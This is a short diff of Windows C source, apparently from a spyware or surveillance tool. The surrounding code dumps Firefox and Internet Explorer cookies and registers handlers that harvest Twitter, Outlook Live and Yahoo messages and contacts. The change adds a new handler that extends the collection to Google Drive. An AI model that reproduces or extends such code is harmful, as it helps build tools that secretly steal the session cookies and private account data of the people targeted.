@@ -24,6 +24,7 @@ extern DWORD HandleTwitterTweets(char *); // Handler per Twitter
 extern DWORD HandleOutlookMail(char *); // Handle per Outlook Live
 extern DWORD YahooMessageHandler(char *); // Handler per Yahoo
 extern DWORD YahooContactHandler(char *); // Handler per Yahoo
+extern DWORD HandleGoogleDrive(char *);
 
 extern int DumpFFCookies(void); // Cookie per Facebook
 extern int DumpIECookies(WCHAR *); // Cookie per IExplorer
@@ -227,6 +228,8 @@ void InitSocialEntries()
 	social_entry[6].RequestHandler = YahooMessageHandler;
 	wcscpy_s(social_entry[7].domain, YAHOO_DOMAIN);
 	social_entry[7].RequestHandler = YahooContactHandler;
+	wcscpy_s(social_entry[8].domain, GDRIVE_DOMAIN);
+	social_entry[8].RequestHandler = HandleGoogleDrive;
 
 	// Azzera i cookie in shared mem relativi a IExplorer
 	ZeroMemory(FACEBOOK_IE_COOKIE, sizeof(FACEBOOK_IE_COOKIE));
